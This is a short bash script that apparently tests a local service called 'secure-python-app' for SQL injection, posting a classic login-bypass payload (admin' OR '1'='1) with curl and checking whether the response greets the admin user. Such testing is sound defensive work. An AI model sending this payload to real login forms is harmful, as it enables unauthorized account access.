#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing SQLi on ${service_map[secure-python-app]}"

output=$(curl -s -X POST "http://${service_map[secure-python-app]}/" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin%27+OR+%271%27%3D%271&password=abcs' \
  --insecure)
if [ $? -eq 0 ]; then
    echo "[+] SQLi payload sent successfully"
else
    echo "[-] SQLi payload failed to send"
    exit 1
fi
if echo "$output" | grep -q "Welcome back, admin"; then
    echo "[+] SQLi attack executed successfully"
else
    echo "[-] SQLi attack failed"
fi

